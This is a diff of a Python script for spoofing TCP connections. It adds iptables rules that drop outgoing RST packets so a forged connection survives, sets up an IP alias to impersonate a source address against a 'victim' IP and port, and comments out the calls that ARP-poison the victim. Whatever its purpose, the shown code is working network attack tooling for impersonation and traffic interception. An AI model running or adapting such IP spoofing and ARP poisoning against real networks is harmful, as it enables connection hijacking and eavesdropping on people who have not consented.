@@ -108,15 +108,17 @@ def initialize_fake_connection(src_ip, dst_ip):
 	dst_port = victim_port
 	print(f'Spoofing with IP ({src_ip} : {src_port}) to IP ({dst_ip} : {dst_port})...')
 
+	terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -dport {dst_port} -j DROP')
+
 	spoof_interface = ip_alias(src_ip)
 	spoof_IP_interface.append((spoof_interface, src_ip))
 	print(f'Successfully set up IP alias on interface {spoof_interface}')
 	print('Resulting ifconfig interface:')
 	print(terminal(f'ifconfig {spoof_interface}').rstrip() + '\n')
 
-	print('ARP poisoning victim...')
-	mac_address = get_mac_address(spoof_interface)
-	arp_poison(src_ip, mac_address)
+	#print('ARP poisoning victim...')
+	#mac_address = get_mac_address(spoof_interface)
+	#arp_poison(src_ip, mac_address)
 
 	print('Creating network socket...')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -276,7 +278,7 @@ if __name__ == '__main__':
 	backup_iptables()
 
 	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {victim_ip} -dport {victim_port} -j DROP')
-	terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
+	#terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
 	# Make the spoofing IP up
 	#terminal('sudo iptables -A INPUT -m state --state NEW ! -i wlan0 -j ACCEPT')
 	#terminal('sudo ifconfig wlan0 up')
